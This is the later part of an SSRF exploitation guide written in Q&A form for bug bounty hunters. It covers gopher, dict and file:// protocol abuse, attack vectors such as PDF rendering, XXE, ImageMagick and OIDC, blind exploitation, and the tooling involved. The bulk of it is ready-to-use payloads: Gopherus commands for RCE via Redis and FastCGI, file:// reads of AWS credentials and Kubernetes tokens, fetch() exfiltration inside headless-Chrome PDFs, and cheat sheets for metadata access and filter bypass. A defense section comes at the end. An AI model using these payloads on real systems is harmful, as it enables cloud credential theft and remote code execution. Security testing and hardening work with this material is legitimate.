Generate the gopher payload with **Gopherus** (`gopherus --exploit redis`) → it outputs the full `gopher://...` URL to drop in the SSRF param.

*In plain words — how a cache database gives you code execution:* **Redis** (port 6379) is a data store that internally usually has **no password** ("only trusted machines can reach it" — but SSRF made you trusted). Redis has a feature to **save its data to a file** — and *you* get to choose the file's name and folder. The trick: tell Redis to write its data into a location the system will later **execute** — the `cron` scheduler's folder (so your line runs as a scheduled job), or `~/.ssh/authorized_keys` (so your SSH key grants login), or the website's folder (a web shell). Redis obediently writes your booby-trapped file, the system runs it, and now your commands execute on their server = RCE. You prove control **safely** first with a harmless command (set a marker key and read it back — already Critical), and only do the file-writing step with explicit authorization since it changes the server.

### Q53. Gopher → FastCGI / PHP-FPM → RCE?
If PHP-FPM (`:9000`) is reachable, gopher can craft a FastCGI record that sets `PHP_VALUE auto_prepend_file=php://input` and sends PHP in the body → arbitrary PHP execution. `gopherus --exploit fastcgi`. Powerful when the web server's FPM is bound to localhost.

### Q54. Gopher → SMTP / other?
Gopher to internal SMTP (`:25`) → send spoofed internal email (phishing/from trusted internal sender). Gopher to Memcached (`:11211`) → poison cache. Gopher to MySQL/Postgres → with auth specifics, run queries. Each is "craft the protocol's bytes and send them."

### Q55. `dict://` — what's it for?
`dict://host:port/` does single-line interactions — great for **banner grabbing** and simple commands: `dict://127.0.0.1:6379/INFO` (Redis info), `dict://127.0.0.1:11211/stats` (Memcached), port-probing by response. Less flexible than gopher but works where gopher is blocked.

### Q56. `file://` — local file read via SSRF?
`file:///etc/passwd`, `file:///proc/self/environ` (env vars/secrets), `file:///proc/self/cmdline`, `file:///etc/hostname`, `file:///root/.aws/credentials`, `file:///var/run/secrets/kubernetes.io/serviceaccount/token`, app config/source. **IF** the fetcher supports `file://` (many Java/`libcurl`/PHP wrappers do) → instant local file disclosure. (In Java, `netdoc://` is an alternate.)

### Q57. How do I add custom headers / use PUT via SSRF (needed for IMDSv2/GCP/Azure)?
- **Gopher**: craft the full HTTP request bytes yourself, including `PUT` and arbitrary headers (e.g., `X-aws-ec2-metadata-token-ttl-seconds`, `Metadata-Flavor: Google`, `Metadata: true`). This is the primary way to defeat header-requiring metadata services via SSRF.
- **CRLF injection** in the URL (Q60) to inject headers into the server's outbound request.
- A **proxy/forwarding** feature that passes your headers through.

### Q58. IF the SSRF is GET-only but the internal action needs POST → ?
Use **gopher** to send a hand-crafted POST (method, headers, body all under your control), or a redirect that the client converts (rare). Gopher turns any GET-only SSRF into arbitrary-method, arbitrary-header, arbitrary-body requests to internal services.

### Q59. What internal services should I enumerate first via gopher/dict/http?
Redis (6379), Memcached (11211), PHP-FPM (9000), Elasticsearch (9200), MongoDB (27017), MySQL (3306), Postgres (5432), Docker (2375/socket), Kubernetes API (6443/443)/kubelet (10250), Jenkins (8080 + `/script`), Consul (8500), Vault (8200), Zabbix (10051), SMTP (25), Spring actuator (8080/8081). Banner-grab with dict, exploit with gopher/http.

### Q60. CRLF injection in SSRF → header/request smuggling?
**IF** you can inject `%0d%0a` into the outbound URL/host → you can inject headers or even a second request into the server's outbound connection. E.g., `http://internal:6379/%0d%0aSET%20...%0d%0a` (poor man's gopher) or inject `Metadata-Flavor: Google` to satisfy GCP. Combine with SSRF for protocol smuggling without gopher.

### Q61. SSRF + request smuggling / connection reuse (expert edge)?
If the SSRF goes through a proxy that reuses backend connections, a CRLF/smuggling primitive can poison or hijack other users' requests, or reach hosts the proxy normally restricts. Niche, high skill — see HTTP request smuggling material.

### Q62. Protocol "IF→THEN" summary.
- Need RCE on internal Redis/FPM → **gopher** (Gopherus).
- Need to read internal files → **file://** (or netdoc:// in Java).
- Need headers/PUT (IMDSv2/GCP/Azure) → **gopher** or **CRLF** injection.
- GET-only but need POST → **gopher**.
- Banner grab / simple cmd → **dict://**.
- Gopher blocked → CRLF, dict, redirect-to-scheme, or a more permissive vector (XXE/ImageMagick).

---

# LEVEL 5 — SSRF VECTORS (beyond `?url=`)

### Q63. Webhooks / callback URLs — why classic SSRF?
Apps that call a user-supplied URL (payment/webhook config, Slack/Teams integrations, CI callbacks, OAuth `redirect`/`jwks_uri`, "send events to this URL") are SSRF by design. Point the webhook at `169.254.169.254`/internal. Often **blind** (server fires the request, you confirm via OAST) but reaches metadata. Check whether the response/validation is reflected.

### Q64. PDF / HTML-to-PDF generators — SSRF + LFI?
*In plain words — why "export to PDF" is a goldmine:* when a site turns a page into a PDF (an invoice, a report, a résumé), a **real browser engine runs on the server** and renders HTML you influence. If you can slip HTML tags into what gets rendered, you can make that server-side browser **fetch internal URLs and files** — and because the fetched content gets **drawn into the PDF you download**, you actually get to *read* the response. That flips a normally-blind feature into a **full-read SSRF plus local file read** in one shot: an `<iframe src="http://169.254.169.254/…">` renders the cloud credentials right onto your PDF, and `<img src="file:///etc/passwd">` renders a server file. With headless Chrome you can even run `<script>fetch(...)</script>`. Test *every* "export/print/screenshot/PDF" feature — it's one of the highest-yield SSRF classes in bug bounty.

"Export to PDF/print" features render attacker HTML with **wkhtmltopdf** or **headless Chrome**:
```html
<iframe src="file:///etc/passwd"></iframe>
<img src="http://169.254.169.254/latest/meta-data/">
<link rel=attachment href="file:///etc/passwd">
<script>fetch('http://169.254.169.254/...').then(r=>r.text()).then(t=>document.write(t))</script>
```
**IF headless Chrome with JS** → you can `fetch()` internal/metadata **and render the result into the PDF** → you *read* the response (full SSRF + data exfil) even when the feature seemed blind. Huge bug-bounty class.

### Q65. XXE → SSRF — how?
XML external entities make the parser fetch URLs:
```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root>&x;</root>
```
**IF** the entity content is reflected → full SSRF/metadata read; **IF** blind → use **parameter entities + external DTD** for OOB exfiltration. Java XXE also supports `ftp://`, `jar://`, `netdoc://`. Office docs (DOCX/XLSX), SVG, SAML, RSS are XXE/SSRF carriers.

### Q66. Image/file processing → SSRF?
- **ImageMagick**: `url:` coder and SVG `<image xlink:href="http://169.254.169.254/...">` make the converter fetch URLs (and ImageTragick can RCE).
- **SVG** in general: `<image href="http://internal/">`, `<feImage>`, external refs → SSRF on rasterization.
- **ffmpeg**: crafted HLS `.m3u8`/AVI playlists with internal/`file://` segments → SSRF + local file read (`concat:`/`subfile:` exfil). Upload a malicious media file to a transcoder.
- **PDF/Office thumbnailers**, **LibreOffice** conversion.

### Q67. Link unfurling / preview / oEmbed (Slack-style)?
Apps that fetch a URL to show a preview (title/image) are SSRF. Paste `http://169.254.169.254/...` or an internal URL; the preview may **leak the response** (title/og:image) → semi-blind data read. Markdown image rendering, RSS readers, "fetch favicon", and OpenGraph unfurlers all qualify.

### Q68. Host-header / routing SSRF?
**IF** the server uses the `Host` (or `X-Forwarded-Host`) header to build an internal URL or route the request → setting `Host: 169.254.169.254` (or an internal name) can redirect the server's own outbound/routing logic internally. Common behind reverse proxies and in "vhost confusion." Test `Host`, `X-Forwarded-Host`, `X-Forwarded-For`, `Forwarded`, `Referer`, `True-Client-IP`.

### Q69. GraphQL / API SSRF?
GraphQL resolvers that fetch URLs (e.g., a `media(url:)` or `webhook(url:)` field), federated schemas pulling remote SDL, or any mutation taking a URL → SSRF. Same payloads, sometimes weaker validation because devs trust the schema.

### Q70. SSO / SAML / OIDC SSRF?
- **SAML**: `AssertionConsumerServiceURL`, metadata `EntityDescriptor` URLs the IdP fetches.
- **OIDC**: `jwks_uri`, `request_uri` (RFC: server fetches a request object from a URL — classic SSRF), `logout` redirect fetchers.
Point these at internal/metadata. `request_uri` SSRF in OIDC is a well-known pattern.

### Q71. "Test connection / health check / is-site-up" features?
Admin tools that ping a URL/host you supply (DB connection testers, "verify endpoint", monitoring config) are direct SSRF. Often in admin panels (higher privilege, internal reach).

### Q72. File upload → SSRF (cross-reference)?
Uploading SVG/XML/media/PDF that the server **processes** triggers SSRF on the processor (Q65–Q66). See the companion File-Upload guide: avatar/KYC/document uploads in fintech apps frequently hit image/PDF processors → SSRF/metadata.

### Q73. Stock tickers, currency, RSS, proxy endpoints?
Any "fetch live data from a source" feature (often with a hidden/default URL you can override, or a `source`/`feed`/`provider` param) is SSRF. Also explicit **proxy/CORS-proxy** endpoints (`/proxy?url=`) are SSRF by definition — confirm scope and internal reach.

### Q74. Vector "IF→THEN" summary.
- `?url=`/webhook → direct SSRF.
- PDF/HTML render (headless Chrome) → SSRF **+ read response** (fetch→render) + LFI (file://).
- XML/DOCX/SVG/SAML → XXE→SSRF (+ OOB exfil).
- ImageMagick/ffmpeg/SVG upload → processor SSRF + file read.
- Link preview/oEmbed/RSS → semi-blind SSRF (title/og leak).
- Host/X-Forwarded-Host → routing SSRF.
- OIDC `request_uri`/`jwks_uri`, SAML metadata → SSRF.

---

# LEVEL 6 — EXPERT / RED-TEAM CHAINS, BLIND EXPLOITATION

### Q75. The canonical SSRF → cloud-takeover chain (Capital One pattern).
1. Find SSRF (a `?url=`/proxy/WAF-misroute).
2. Hit `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → temp IAM creds.
3. `aws sts get-caller-identity` (prove); then the role's permissions dictate impact (S3 read, etc.).
4. Report: SSRF + creds proof + the role's effective permissions = **Critical**. (Capital One: ~100M records via this exact path; AWS then shipped IMDSv2.)

*In plain words — this is the whole reason SSRF is famous, told as a story:* in 2019 an attacker found an SSRF in Capital One's setup, pointed it at the metadata address `169.254.169.254`, and read back the server's temporary AWS keys. Those keys had permission to read the bank's storage buckets, so the attacker downloaded **~100 million customer records**. Every step is exactly the four above: *find the fetch → aim it at the credential vault → grab the keys → use them.* The lesson for you: this is the **default play** whenever you confirm SSRF on AWS — try metadata first, and if you get keys, prove they're real with the single harmless command `aws sts get-caller-identity` (which just says "yes, these keys are valid and here's who they belong to") and **stop there** — that alone is a complete Critical; you never need to actually download real data. (AWS invented IMDSv2, Q23, specifically to make this harder.)

### Q76. SSRF → internal RCE chain.
1. SSRF confirmed; port-scan localhost/internal (Q83) → find Redis `:6379` (or PHP-FPM, Jenkins).
2. **Gopher → Redis** → write cron/SSH key → command execution on the internal host. Or **gopher → FastCGI** → PHP RCE. Or SSRF → Jenkins `/script` → Groovy RCE. Or **Spring actuator `/heapdump`** → creds → pivot.
3. From the internal host, pivot deeper. (In bounty, stop at demonstrable RCE proof in scope.)

### Q77. How do I exploit a fully BLIND SSRF (no response, no metadata header primitive)?
- **OAST confirm** first.
- **Side-effect endpoints**: hit internal URLs that *do something* observable (create a record, send a notification you receive, trigger a build).
- **Exfil via the vector's own output**: link-preview leaks the title; PDF render embeds the fetched content; error messages leak length/snippet.
- **Time-based oracle**: diff response time for open vs closed ports / valid vs invalid internal paths → blind port/host scan.
- **DNS exfil**: if you reach an internal service that does a DNS lookup of attacker-controlled data, encode bytes into subdomains.
- **Second-order**: the fetched data is stored and surfaced elsewhere later.

### Q78. IF blind SSRF can reach metadata but can't read it → can I still win?
Sometimes: use a **header/method primitive** (gopher/CRLF) to satisfy IMDSv2/GCP and route the credential into an **OOB exfil** (e.g., gopher that POSTs the metadata response to your server, or chains the token into a request to your host). If you truly can't extract the data, you still report blind-SSRF-to-metadata as High (with the OOB callback proving reach) and demonstrate the *reachability*.

### Q79. Time-based blind port scanning — how?
Send `?url=http://10.0.0.5:PORT/` across ports and measure latency / error type:
- **Fast "connection refused"** → closed.
- **Immediate success / banner** → open.
- **Long hang then timeout** → filtered or open-no-response.
Diff these to map internal hosts/ports even fully blind. Automate with Burp Intruder + response-time/length columns or **SSRFmap**.

### Q80. Internal network discovery via SSRF?
Enumerate likely ranges (`10.0.0.0/8`, `172.16/12`, `192.168/16`, the cloud VPC CIDR from metadata, `kubernetes.default.svc`, `*.internal`), scan common ports, grab banners (dict://), and fingerprint services. Metadata's `network` info and `instance-identity` reveal the VPC/subnet to target.

### Q81. SSRF → WAF/cloud-routing bypass (real-world)?
Some SSRFs arise from **misrouted requests at the edge** (a proxy/WAF forwarding to an attacker-influenced upstream) — Capital One's was partly a WAF (`mod_security`/instance) that could be made to query metadata. Look at how the front door builds upstream requests (Host header, path-based routing, `X-Forwarded-*`).

### Q82. SSRF + CRLF + connection reuse → request injection (expert)?
With a CRLF primitive in the outbound request and a keep-alive backend, you may inject a *second* request on the same connection or smuggle headers to bypass internal auth (e.g., add an internal `X-Forwarded-For: 127.0.0.1` or auth header the internal service trusts). High skill, high impact.

### Q83. How do I maximize SSRF severity for bounty?
- **Reach cloud metadata → prove valid creds** (`sts get-caller-identity`) = Critical.
- **Read internal-only data / admin panels** = High/Critical.
- **gopher → internal RCE** = Critical.
- **Full SSRF (response read)** beats blind; show the actual internal content.
- Even **blind SSRF with OAST + metadata reachability** is reportable High.
- Document the exact bypass and the **business impact**.

### Q84. What kills SSRF reports in triage (and how to preempt)?
- "Only DNS pinged, no fetch" → demonstrate an **HTTP** hit and an internal read.
- "Points to a sandbox/no-creds fetcher" → show it reaches **metadata/internal**, not just the internet.
- "Blind with no impact" → reach metadata (OOB) or an internal side-effect; show *something* internal.
- "Resolves but IMDSv2 blocks" → either get the header primitive or report the reachability honestly as lower sev.
Always include the OAST evidence + the internal proof.

### Q85. SSRF in serverless / managed platforms?
Lambda/Cloud Functions have their own credential-exposure paths (env vars `AWS_*`, `file:///proc/self/environ`, the runtime API `http://localhost:9001/...` for Lambda extensions, `$AWS_LAMBDA_RUNTIME_API`). SSRF/`file://` in a function can leak the execution-role creds via environment rather than IMDS.

### Q86. Expert mindset summary.
SSRF = "**make the server connect somewhere it shouldn't.**" Find the fetcher → confirm via OAST → determine full vs blind → aim at **metadata/internal** → if filtered, win the **parser/encoding/redirect/rebinding** game → if HTTP-only, **switch protocols (gopher/file)** for headers/PUT/RCE → **chain to cloud creds or internal RCE** → prove minimally, report the chain.

---

# TOOLING

### Q87. Core SSRF toolkit?
- **Burp Suite** + **Collaborator** (OAST), **Param Miner** (hidden params), **Repeater/Intruder** (encoding fuzz, time-based scan), **Match&Replace**.
- **interactsh** (OAST), **OOB** DNS/HTTP listeners.
- **Gopherus** — generates `gopher://` payloads for Redis/FastCGI/MySQL/SMTP/Zabbix → RCE.
- **SSRFmap** — automated SSRF exploitation (metadata, port scan, gopher, redis, etc.).
- **ssrf-sheriff** — controlled SSRF detection server.
- **Singularity of Origin** / **rbndr** — DNS rebinding.
- **nip.io / sslip.io / 1u.ms** — wildcard DNS to arbitrary IPs (encode internal IPs as hostnames).
- **Arjun / ffuf** — parameter & endpoint discovery.
- **nuclei** — SSRF templates / OOB detection.
- **PayloadsAllTheThings / HackTricks** — payload + bypass libraries.

### Q88. Gopherus quickstart?
```bash
gopherus --exploit redis        # paste the resulting gopher://127.0.0.1:6379/_... into the SSRF param
gopherus --exploit fastcgi      # PHP-FPM RCE
gopherus --exploit smtp / mysql / zabbix / pymemcache
```
It outputs a ready URL-encoded gopher payload tailored to the target service.

### Q89. SSRFmap quickstart?
```bash
# capture an SSRF request to a file (req.txt) marking the injected param with the placeholder
python ssrfmap.py -r req.txt -p url -m readfiles,portscan,redis,aws,gopher
```
Modules: cloud metadata (`aws`/`gce`/`alibaba`/`digitalocean`), `portscan`, `redis`, `fastcgi`, `readfiles`, `tomcat`, `smtp`, etc.

### Q90. How do I build a reliable SSRF detection oracle?
Use a unique OAST subdomain per test; correlate **DNS** vs **HTTP** hits to the exact payload/param; for internal reads, define success as "response body contains expected internal marker" (e.g., `root:x:0:0` for `/etc/passwd`, `ami-id` for metadata) — not just status 200. For time-based, threshold on latency deltas.

---

# BLACK-BOX METHODOLOGY & DECISION TREE

### Q91. Step-by-step methodology.
1. **Enumerate fetchers**: URL params, webhooks, PDF/HTML render, file/image processing, XML/SAML/OIDC, link preview, Host-header routing, "test connection".
2. **Confirm** with OAST → DNS+HTTP hit (full vs blind).
3. **Probe targets**: `169.254.169.254` (metadata), `127.0.0.1` + common ports, internal hosts, `file://`.
4. **If filtered → bypass** (encoding / redirect / rebinding / parser / open-redirect-on-allowed).
5. **If HTTP-only/headers needed → switch protocol** (gopher/file/dict) and/or CRLF for headers/PUT.
6. **Escalate**: cloud creds → `sts get-caller-identity`; internal service → banner → gopher RCE; actuator/heapdump → secrets; port scan.
7. **Report**: OAST evidence + internal/metadata proof + chain + impact + remediation.

### Q92. The master decision tree.
```
Does a server-side fetch use user-influenced URL/host/header?
  NO  -> look harder (webhooks, PDF, XXE, image proc, Host header, OIDC request_uri)
  YES -> OAST test:
     HTTP hit + response reflected -> FULL SSRF
     OAST hit, no body            -> BLIND SSRF
     nothing                      -> filtered/not-SSRF
  Aim at 169.254.169.254 / 127.0.0.1 / internal:
     reachable + readable -> grab metadata/internal data
     blocked              -> BYPASS:
        localhost/IP blocklist -> encode (dec/hex/oct/IPv6/nip.io)
        allowlist host         -> @ / # / \ / subdomain / open-redirect-on-allowed / rebind
        resolves-then-checks   -> DNS rebinding / redirect (302 to internal)
        scheme restricted      -> redirect scheme-switch / XXE / ImageMagick
        parser regex           -> unicode/IDN/parser-differential
  Need headers/PUT (IMDSv2/GCP/Azure)?  -> gopher / CRLF injection
  Need RCE on internal svc?             -> gopher (Redis/FastCGI), Jenkins /script, actuator
  Blind only?  -> OOB confirm + time-based portscan + side-effects + PDF-render read + DNS exfil
  -> Chain to cloud takeover / internal RCE; prove minimally; report.
```

### Q93. What evidence makes a strong SSRF report?
The injected request, the **OAST callback** (DNS+HTTP) tied to it, the **internal/metadata content** read back (e.g., role name + a redacted `sts get-caller-identity` ARN, or `/etc/passwd` first line), the exact **bypass** used, and the **impact/chain** (cloud creds → what the role can do; or gopher → RCE). For blind, the OOB proof + a side-effect. Redact secrets; don't dump prod data.

### Q94. Common false positives / non-issues.
- **DNS-only** hit (a scanner/AV/parser resolved your host) with no HTTP fetch → not necessarily exploitable SSRF.
- Fetch goes through a **sandboxed, no-network-to-internal** service → may only reach the public internet (lower/again-check).
- "SSRF" that's actually just an **open redirect / fetch-the-internet** with no internal reach → lower severity.
- Reflected error containing your *own* URL ≠ internal access.
Always prove **internal/metadata** reach, not just "it fetched my OAST."

*In plain words — the trap that sinks most beginner SSRF reports:* "the server fetched my link!" feels like a win, but by itself it's usually **Low or nothing**. The feature was often *designed* to fetch external links, so reaching the public internet proves little; a mere DNS lookup could be an antivirus scanner, not a real fetch; and an error that echoes your own URL isn't internal access. The rule: a callback is a **door, not the treasure.** You only have a real finding when you can say *"the server reached `<something internal or the metadata vault>` and I got `<credentials / internal data / a file / code execution>`."* If you can't say that yet, keep escalating (bypass the filter, aim at metadata, try gopher) before you write the report.

### Q95. Quick severity triage.
- Reaches cloud metadata → valid creds → **Critical**.
- gopher → internal RCE → **Critical**.
- Reads internal-only data / admin / `file://` secrets → **High/Critical**.
- Full SSRF to arbitrary internal HTTP → **High**.
- Blind SSRF reaching internal (OOB-proven) → **Medium/High**.
- SSRF only to public internet (no internal reach) → **Low/Medium**.

---

# PAYLOAD CHEAT SHEETS

### Q96. Localhost / metadata payloads.
```
http://127.0.0.1/   http://127.1/   http://0/   http://0.0.0.0/   http://[::1]/
http://2130706433/  http://0x7f000001/  http://0177.0.0.1/   http://localtest.me/
AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
       http://169.254.169.254/latest/user-data/
       http://169.254.169.254/latest/dynamic/instance-identity/document
GCP:   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token   (Header: Metadata-Flavor: Google)
       http://metadata.google.internal/computeMetadata/v1beta1/...   (no header, legacy)
Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/  (Header: Metadata: true)
DO:    http://169.254.169.254/metadata/v1/
Alibaba: http://100.100.100.100/latest/meta-data/
k8s:   file:///var/run/secrets/kubernetes.io/serviceaccount/token
```

### Q97. Metadata-IP encodings (when `169.254.169.254` is blocked).
```
http://2852039166/                 (decimal)
http://0xA9FEA9FE/                  (hex)
http://0251.0376.0251.0376/         (octal)
http://[::ffff:169.254.169.254]/    (IPv6-mapped)
http://[::ffff:a9fe:a9fe]/
http://169.254.169.254.nip.io/
attacker.com -> 302 Location: http://169.254.169.254/latest/meta-data/   (redirect bypass)
```

### Q98. Allowlist / parser-confusion payloads.
```
http://allowed.com@169.254.169.254/          http://169.254.169.254#@allowed.com/
http://allowed.com.evil.com/                  http://evil.com/?x=allowed.com
http://allowed.com\@169.254.169.254/          http://169.254.169.254\.allowed.com/
http://foo@127.0.0.1:80@allowed.com/          http://①②⑦.⓪.⓪.①/
http://allowed.com/openredirect?to=http://169.254.169.254/   (open-redirect-on-allowed)
DNS rebinding: http://7f000001.<your-rebinder>/   (public IP then 127.0.0.1)
```

### Q99. Protocol / RCE payloads.
```
file:///etc/passwd     file:///proc/self/environ     file:///root/.aws/credentials
dict://127.0.0.1:6379/INFO        dict://127.0.0.1:11211/stats
gopher://127.0.0.1:6379/_<urlencoded Redis SET/CONFIG/SAVE>   (use Gopherus)
gopher://127.0.0.1:9000/_<urlencoded FastCGI record -> PHP RCE>
http://127.0.0.1:8080/actuator/heapdump          (Spring secrets)
http://127.0.0.1:8080/script                      (Jenkins Groovy console -> RCE)
CRLF header inject: http://169.254.169.254/...%0d%0aMetadata-Flavor:%20Google
```

---

# REAL-WORLD CASE PATTERNS & REFERENCES

### Q100. Recurring patterns in real SSRF bounties/breaches.
- **`?url=`/proxy/import-from-URL → AWS IMDS → IAM creds → S3** (the Capital One 2019 pattern; countless bounty variants).
- **Webhook/integration callback** → blind SSRF → metadata.
- **HTML-to-PDF (headless Chrome) → `fetch` internal/metadata rendered into the PDF** → full read (huge class on invoice/report exporters).
- **XXE in DOCX/SVG/SAML → SSRF/file read** (resume parsers, KYC, SSO).
- **ImageMagick/SVG/ffmpeg upload → processor SSRF** (avatar/media pipelines).
- **OIDC `request_uri` / SAML metadata SSRF.**
- **Gopher → internal Redis/FastCGI → RCE.**
- **Spring Boot `/actuator/heapdump` via SSRF → credential mining.**

### Q101. Resources to actually work through.
- **PortSwigger Web Security Academy → SSRF** (all labs: basic, against another back-end system, blacklist/allowlist bypass, open-redirect bypass, blind SSRF via Referer + Collaborator, blind SSRF with Shellshock).
- **OWASP SSRF Prevention Cheat Sheet** + WSTG SSRF tests.
- **Orange Tsai, "A New Era of SSRF" (Black Hat USA 2017)** — the URL-parser-confusion bible.
- **HackTricks → SSRF**; **PayloadsAllTheThings → Server Side Request Forgery.**
- Read disclosed **HackerOne/Bugcrowd SSRF reports** (filter "SSRF", "metadata", "IMDS", "gopher") — internalize the chains.
- AWS docs on **IMDSv2** (why it exists = SSRF defense).

### Q102. Things to know by name.
- **Capital One breach (2019)** — SSRF → IMDS → ~100M records; the case that mainstreamed SSRF.
- **AWS IMDSv2** — session-token defense introduced because of SSRF.
- **Orange Tsai's URL-parser confusion** payloads.
- **Gopherus** — gopher-to-RCE tooling.
- **ImageTragick / SVG / ffmpeg HLS** SSRF vectors.
- **OIDC `request_uri` SSRF**, **GCP `v1beta1` header-less metadata**.

---

# DEFENSE — HOW TO STOP SSRF PROPERLY

### Q103. What's the gold-standard SSRF defense (layered)?
1. **Allowlist** the exact destinations/schemes/ports the feature needs (host + scheme + port). Default-deny everything else. Allowlists beat blocklists.
2. **Resolve the hostname, validate the resolved IP** against a deny-list of **private/loopback/link-local/reserved/metadata** ranges (`127/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16`, `::1`, `fc00::/7`, `100.100.100.100`, etc.) **AND re-validate at connection time / pin the IP** to defeat DNS rebinding.
3. **Disable unused URL schemes** — allow only `http`/`https`; block `file/gopher/dict/ftp/...`.
4. **Don't follow redirects** (or re-validate the destination on every hop).
5. **Don't return raw fetched responses** to the user (kills full SSRF / data read).
6. **Network egress controls**: the fetching service runs in a segment that **cannot reach** the metadata endpoint or internal admin nets (block `169.254.169.254` at the host/network).
7. **AWS: enforce IMDSv2 + set hop limit = 1**; GCP/Azure: lock down metadata access.
8. **Harden secondary vectors**: disable XXE (no external entities/DTDs), restrict ImageMagick (`policy.xml` — no `url`/`mvg`/`msl`), sanitize HTML before PDF render and run the renderer with no internal network + JS disabled where possible.

### Q104. Why is a blocklist of IPs not enough?
Because of **encodings** (decimal/octal/hex/IPv6-mapped), **DNS names** resolving to internal IPs, **DNS rebinding** (TOCTOU), **redirects**, and **parser differentials**. The robust control is "resolve → check the *actual IP* you'll connect to against private ranges → pin and connect to that exact IP," plus an allowlist. String-matching the URL is bypassable.

### Q105. Per-vector hardening map.
- **URL fetch/webhook**: allowlist + resolved-IP validation + IP pinning + no redirects + scheme allowlist + egress firewall.
- **HTML-to-PDF**: render in an isolated network (no internal/metadata reach), disable `file://` and JS fetch, sanitize input HTML.
- **XML/SAML/OIDC**: disable external entities; allowlist `request_uri`/`jwks_uri`/metadata hosts.
- **Image/media processing**: ImageMagick `policy.xml` (disable URL/SVG coders), sandbox, patch; validate file types.
- **Host header**: don't use untrusted `Host`/`X-Forwarded-Host` to build internal URLs.
- **Cloud**: IMDSv2 + hop-limit-1; block `169.254.169.254` egress from workloads that don't need it; least-privilege instance roles (so even leaked creds are low-impact).

### Q106. One-paragraph summary to quote in a report.
*"SSRF defense must validate the destination the server will actually connect to — not the URL string. Allowlist permitted hosts/schemes/ports, resolve the name and reject any private/loopback/link-local/metadata IP, then pin and connect to that exact IP to defeat DNS rebinding; disable non-HTTP schemes and redirect-following; never echo fetched responses; and enforce network egress controls so the fetcher cannot reach `169.254.169.254` or internal admin services. On AWS, require IMDSv2 with hop-limit 1 and least-privilege instance roles. Also close the secondary vectors (XXE, ImageMagick/SVG, HTML-to-PDF, Host-header routing). A single unvalidated server-side fetch can escalate from a benign URL to internal RCE or full cloud-account takeover — as Capital One demonstrated."*

---

## APPENDIX — 60-second field checklist
```
[ ] Find every server-side fetcher (?url=, webhook, PDF/HTML render, XXE, image/ffmpeg, Host header, OIDC request_uri, link preview, "test connection")
[ ] OAST test -> DNS+HTTP hit? full (body reflected) or blind?
[ ] Hit 169.254.169.254 (AWS/GCP/Azure/DO/Alibaba/OCI) + 127.0.0.1 + internal hosts + file://
[ ] Metadata creds -> aws sts get-caller-identity (prove, don't loot)
[ ] IMDSv2/GCP/Azure header needed? -> gopher / CRLF to add PUT + header
[ ] Filtered? -> encode IP (dec/hex/oct/IPv6/nip.io) / redirect-302-to-internal / DNS rebinding / @,#,\ allowlist tricks / open-redirect-on-allowed / unicode parser-confusion
[ ] HTTP-only? -> redirect scheme-switch ; gopher (Redis/FastCGI RCE) ; dict (banner) ; file:// (read)
[ ] Blind? -> time-based portscan ; side-effect endpoints ; PDF-render reads response ; DNS exfil ; second-order
[ ] Internal svc found? -> banner (dict) -> exploit (gopher Redis/FPM, Jenkins /script, Spring /heapdump)
[ ] Escalate -> cloud takeover / internal RCE ; report OAST + internal proof + chain + fix
```
*End of guide.*
